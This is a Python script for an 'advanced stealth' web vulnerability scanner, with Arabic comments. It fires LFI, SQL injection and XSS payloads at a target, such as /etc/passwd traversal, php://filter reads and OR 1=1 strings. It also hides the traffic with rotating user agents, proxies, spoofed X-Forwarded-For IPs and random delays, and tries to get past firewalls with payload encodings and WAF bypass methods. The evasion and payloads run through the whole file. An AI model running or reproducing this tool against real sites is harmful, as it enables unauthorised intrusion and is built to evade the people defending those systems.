#!/usr/bin/env python3

# Advanced Stealth Web Vulnerability Scanner
# مع ميزات التخفي وتخطي جدران الحماية

import sys
import json
import requests
import urllib3
import argparse
import time
import re
import random
import string
from urllib.parse import urljoin, urlparse, quote
from datetime import datetime
from fake_useragent import UserAgent
import socket

# Disable SSL warnings for testing
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class StealthScanner:
    def __init__(self, target_url, timeout=15, rotate_user_agents=True, 
                 use_proxies=False, random_delays=True, mimic_human=True):
        self.target_url = target_url.rstrip('/')
        self.timeout = timeout
        self.rotate_user_agents = rotate_user_agents
        self.use_proxies = use_proxies
        self.random_delays = random_delays
        self.mimic_human = mimic_human
        self.session = requests.Session()
        self.session.verify = False
        
        # Initialize stealth features
        self.ua = UserAgent()
        self.proxies = self._load_proxies() if use_proxies else []
        self.headers_pool = self._generate_headers_pool()
        self.current_proxy_index = 0
        self.current_ua_index = 0
        
        self.vulnerabilities = []
        self.scan_start_time = datetime.now()
        self.request_count = 0
        
    def _load_proxies(self):
        """تحميل قائمة من البروكسيات"""
        return [
            {'http': 'http://proxy1.com:8080', 'https': 'https://proxy1.com:8080'},
            {'http': 'http://proxy2.com:3128', 'https': 'https://proxy2.com:3128'},
            {'http': 'http://proxy3.com:8080', 'https': 'https://proxy3.com:8080'},
        ]
    
    def _generate_headers_pool(self):
        """توليد مجموعة متنوعة من الهيدرز لتدويرها"""
        return [
            # Chrome on Windows
            {
                'User-Agent': self.ua.chrome,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'DNT': '1',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Cache-Control': 'max-age=0'
            },
            # Firefox on Linux
            {
                'User-Agent': self.ua.firefox,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'DNT': '1',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none'
            },
            # Safari on Mac
            {
                'User-Agent': self.ua.safari,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1'
            },
            # Edge on Windows
            {
                'User-Agent': self.ua.edge,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'DNT': '1',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1'
            }
        ]
    
    def _rotate_identity(self):
        """تدوير الهوية للتخفي"""
        if self.rotate_user_agents:
            # تدوير User-Agent
            headers = self.headers_pool[self.current_ua_index % len(self.headers_pool)]
            self.current_ua_index += 1
            
            # إضافة هيدرز عشوائية
            if random.choice([True, False]):
                headers['X-Forwarded-For'] = self._generate_random_ip()
            if random.choice([True, False]):
                headers['X-Real-IP'] = self._generate_random_ip()
            if random.choice([True, False]):
                headers['Referer'] = self._generate_random_referer()
            
            self.session.headers.update(headers)
        
        if self.use_proxies and self.proxies:
            # تدوير البروكسي
            proxy = self.proxies[self.current_proxy_index % len(self.proxies)]
            self.current_proxy_index += 1
            self.session.proxies.update(proxy)
    
    def _generate_random_ip(self):
        """توليد IP عشوائي"""
        return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    
    def _generate_random_referer(self):
        """توليد Referer عشوائي"""
        referers = [
            'https://www.google.com/search?q=test',
            'https://www.bing.com/search?q=test',
            'https://search.yahoo.com/search?p=test',
            'https://duckduckgo.com/?q=test',
            'https://www.baidu.com/s?wd=test'
        ]
        return random.choice(referers)
    
    def _add_random_delay(self):
        """إضافة تأخير عشوائي لتقليل الاشتباه"""
        if self.random_delays:
            delay = random.uniform(0.5, 3.0)
            time.sleep(delay)
    
    def _encode_payload(self, payload, method='mixed'):
        """ترميز الحمولة لتخطي الفلاتر"""
        if method == 'url':
            return quote(payload)
        elif method == 'double':
            return quote(quote(payload))
        elif method == 'mixed':
            # ترميز مختلط
            encoded = ""
            for char in payload:
                if random.choice([True, False]):
                    encoded += quote(char)
                else:
                    encoded += char
            return encoded
        elif method == 'unicode':
            # استخدام ترميز unicode
            unicode_map = {
                '/': '%u2215', '.': '%u002e', '\\': '%u2216',
                'a': '%u0061', 'e': '%u0065', 't': '%u0074',
                'c': '%u0063', 'p': '%u0070', 's': '%u0073'
            }
            result = payload
            for char, uni in unicode_map.items():
                result = result.replace(char, uni)
            return result
        return payload
    
    def _bypass_techniques(self, payload, param):
        """تقنيات تخطي متقدمة"""
        techniques = []
        
        # 1. الترميزات المختلفة
        techniques.extend([
            {'param': param, 'payload': self._encode_payload(payload, 'url')},
            {'param': param, 'payload': self._encode_payload(payload, 'double')},
            {'param': param, 'payload': self._encode_payload(payload, 'mixed')},
            {'param': param, 'payload': self._encode_payload(payload, 'unicode')},
        ])
        
        # 2. حالات مختلفة
        techniques.extend([
            {'param': param.upper(), 'payload': payload},
            {'param': param.lower(), 'payload': payload},
            {'param': param.capitalize(), 'payload': payload},
        ])
        
        # 3. إضافة مسافات ومحارف خاصة
        techniques.extend([
            {'param': f" {param}", 'payload': f" {payload}"},
            {'param': f"{param}\t", 'payload': f"{payload}\t"},
            {'param': f"{param}\n", 'payload': f"{payload}\n"},
        ])
        
        # 4. تكرار المعلمات
        techniques.extend([
            {'param': param, 'payload': payload, 'repeat': 2},
            {'param': param, 'payload': payload, 'repeat': 3},
        ])
        
        return techniques
    
    def _make_stealth_request(self, method, url, **kwargs):
        """إجراء طلب مع ميزات التخفي"""
        self._rotate_identity()
        self._add_random_delay()
        self.request_count += 1
        
        try:
            if method.upper() == 'GET':
                response = self.session.get(url, timeout=self.timeout, **kwargs)
            elif method.upper() == 'POST':
                response = self.session.post(url, timeout=self.timeout, **kwargs)
            else:
                response = self.session.request(method, url, timeout=self.timeout, **kwargs)
            
            return response
            
        except requests.exceptions.RequestException as e:
            print(f"[-] Request failed: {e}")
            return None
    
    def add_vulnerability(self, name, severity, description, proof_of_concept, exploitation_method):
        vuln = {
            'name': name,
            'severity': severity,
            'description': description,
            'proof_of_concept': proof_of_concept,
            'exploitation_method': exploitation_method,
            'timestamp': datetime.now().isoformat(),
            'detection_method': 'stealth_scan'
        }
        self.vulnerabilities.append(vuln)
        print(f"[{severity.upper()}] {name}: {description}")
    
    def test_stealth_lfi(self):
        """اختبار LFI مع تقنيات تخفي متقدمة"""
        print("[*] Testing for LFI with stealth techniques...")
        
        lfi_payloads = [
            "../../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "/etc/passwd",
            "C:\\windows\\system32\\drivers\\etc\\hosts",
            "php://filter/convert.base64-encode/resource=index.php",
            "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg=="
        ]
        
        test_params = ['file', 'page', 'include', 'template', 'path', 'document']
        
        for param in test_params:
            for payload in lfi_payloads:
                # استخدام تقنيات التخطي
                bypass_techniques = self._bypass_techniques(payload, param)
                
                for technique in bypass_techniques:
                    current_param = technique['param']
                    current_payload = technique['payload']
                    
                    # بناء الطلب
                    if 'repeat' in technique:
                        # تكرار المعلمات
                        url = f"{self.target_url}/test?"
                        for i in range(technique['repeat']):
                            url += f"{current_param}={current_payload}&"
                        url = url.rstrip('&')
                    else:
                        url = f"{self.target_url}/test?{current_param}={current_payload}"
                    
                    response = self._make_stealth_request('GET', url)
                    
                    if response and any(indicator in response.text for indicator in [
                        'root:x:', 'daemon:', 'Administrator', 'PD9waH', 'base64'
                    ]):
                        self.add_vulnerability(
                            "File Inclusion (LFI/RFI) - Stealth",
                            "critical",
                            f"LFI vulnerability found with stealth techniques in parameter '{param}'",
                            f"Payload: {current_payload} (Technique: {technique})",
                            "Use various encoding and bypass techniques to access sensitive files"
                        )
                        return
    
    def test_stealth_sql_injection(self):
        """اختبار SQL Injection مع تقنيات تخفي"""
        print("[*] Testing for SQL Injection with stealth techniques...")
        
        sql_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT null--",
            "1' AND 1=1--",
            "1' AND 1=2--",
            "' OR SLEEP(5)--",
            "'/**/OR/**/1=1#",
            "' OR 1=1-- -",
            "' OR '1'='1' /*",
            "admin'--",
            "admin' #",
            "admin'/*"
        ]
        
        test_params = ['id', 'user', 'name', 'email', 'search', 'q', 'page', 'cat']
        
        for param in test_params:
            for payload in sql_payloads:
                bypass_techniques = self._bypass_techniques(payload, param)
                
                for technique in bypass_techniques:
                    current_param = technique['param']
                    current_payload = technique['payload']
                    
                    url = f"{self.target_url}/test?{current_param}={current_payload}"
                    response = self._make_stealth_request('GET', url)
                    
                    if response and any(error in response.text.lower() for error in [
                        'mysql_fetch_array', 'ora-', 'postgresql', 'microsoft ole db',
                        'sqlserver', 'syntax error', 'warning: mysql', 'sqlstate'
                    ]):
                        self.add_vulnerability(
                            "SQL Injection - Stealth",
                            "critical",
                            f"SQL injection found with stealth techniques in parameter '{param}'",
                            f"Payload: {current_payload}",
                            "Use time-based or union-based exploitation"
                        )
                        return
    
    def test_stealth_xss(self):
        """اختبار XSS مع تقنيات تخفي"""
        print("[*] Testing for XSS with stealth techniques...")
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<div onclick=alert('XSS')>Click</div>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>"
        ]
        
        test_params = ['search', 'q', 'name', 'input', 'text', 'message', 'comment', 'title']
        
        for param in test_params:
            for payload in xss_payloads:
                bypass_techniques = self._bypass_techniques(payload, param)
                
                for technique in bypass_techniques:
                    current_param = technique['param']
                    current_payload = technique['payload']
                    
                    url = f"{self.target_url}/test?{current_param}={current_payload}"
                    response = self._make_stealth_request('GET', url)
                    
                    if response and current_payload in response.text:
                        self.add_vulnerability(
                            "Cross-Site Scripting (XSS) - Stealth",
                            "high",
                            f"Reflected XSS found with stealth techniques in parameter '{param}'",
                            f"Payload: {current_payload}",
                            "Craft stealthy XSS payloads to bypass filters"
                        )
                        return
    
    def test_waf_bypass(self):
        """اختبار تخطي جدار الحماية WAF"""
        print("[*] Testing WAF bypass techniques...")
        
        # اختبار وجود WAF
        test_payloads = [
            "<script>alert('test')</script>",
            "' OR 1=1--",
            "../../../etc/passwd"
        ]
        
        for payload in test_payloads:
            # اختبار مباشر
            url = f"{self.target_url}/test?payload={payload}"
            response = self._make_stealth_request('GET', url)
            
            if response:
                # التحقق من وجود WAF
                waf_signatures = [
                    'cloudflare', 'sucuri', 'akamai', 'incapsula',
                    'f5 big-ip', 'barracuda', 'fortinet', 'aws waf'
                ]
                
                for signature in waf_signatures:
                    if signature in response.headers.get('Server', '').lower() or \
                       signature in response.text.lower():
                        print(f"[+] WAF detected: {signature}")
                        self._test_waf_bypass_methods(signature)
                        return
    
    def _test_waf_bypass_methods(self, waf_type):
        """اختبار طرق تخطي WAF محددة"""
        print(f"[*] Testing {waf_type} bypass methods...")
        
        # طرق تخطي حسب نوع WAF
        bypass_methods = {
            'cloudflare': [
                {'method': 'POST', 'headers': {'CF-Connecting-IP': '127.0.0.1'}},
                {'method': 'GET', 'headers': {'X-Forwarded-For': '127.0.0.1, 127.0.0.1'}},
            ],
            'general': [
                {'method': 'POST', 'encode': 'base64'},
                {'method': 'PUT', 'headers': {'Content-Type': 'application/json'}},
                {'method': 'PATCH', 'headers': {'X-HTTP-Method-Override': 'GET'}},
            ]
        }
        
        # تنفيذ طرق التخطي
        methods = bypass_methods.get(waf_type, bypass_methods['general'])
        
        for method in methods:
            # هنا يمكن إضافة منطق اختبار محدد
            pass
    
    def run_stealth_scan(self):
        """تشغيل الفحص الكامل مع التخفي"""
        print(f"[*] Starting stealth scan for {self.target_url}")
        print(f"[*] Stealth features: Rotate UA={self.rotate_user_agents}, Proxies={self.use_proxies}")
        
        # تشغيل جميع اختبارات التخفي
        self.test_stealth_lfi()
        self.test_stealth_sql_injection()
        self.test_stealth_xss()
        self.test_waf_bypass()
        
        # إنشاء التقرير
        self.generate_stealth_report()
    
    def generate_stealth_report(self):
        """توليد تقرير الفحص المتخفي"""
        report = {
            'scan_type': 'stealth_vulnerability_scan',
            'target_url': self.target_url,
            'scan_start_time': self.scan_start_time.isoformat(),
            'scan_end_time': datetime.now().isoformat(),
            'total_requests': self.request_count,
            'stealth_features': {
                'user_agent_rotation': self.rotate_user_agents,
                'proxy_usage': self.use_proxies,
                'random_delays': self.random_delays,
                'human_mimicry': self.mimic_human
            },
            'vulnerabilities_found': self.vulnerabilities,
            'vulnerability_summary': {
                'critical': len([v for v in self.vulnerabilities if v['severity'] == 'critical']),
                'high': len([v for v in self.vulnerabilities if v['severity'] == 'high']),
                'medium': len([v for v in self.vulnerabilities if v['severity'] == 'medium']),
                'low': len([v for v in self.vulnerabilities if v['severity'] == 'low'])
            }
        }
        
        # حفظ التقرير
        filename = f"stealth_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        print(f"[+] Stealth scan report saved to {filename}")
        return filename

def main():
    parser = argparse.ArgumentParser(description='Advanced Stealth Web Vulnerability Scanner')
    parser.add_argument('target', help='Target URL to scan')
    parser.add_argument('--timeout', type=int, default=15, help='Request timeout (default: 15)')
    parser.add_argument('--no-ua-rotate', action='store_true', help='Disable user agent rotation')
    parser.add_argument('--use-proxies', action='store_true', help='Use proxy rotation')
    parser.add_argument('--no-delays', action='store_true', help='Disable random delays')
    
    args = parser.parse_args()
    
    scanner = StealthScanner(
        target_url=args.target,
        timeout=args.timeout,
        rotate_user_agents=not args.no_ua_rotate,
        use_proxies=args.use_proxies,
        random_delays=not args.no_delays
    )
    
    try:
        scanner.run_stealth_scan()
    except KeyboardInterrupt:
        print("\n[!] Scan interrupted by user")
        sys.exit(1)

if __name__ == "__main__":
    main()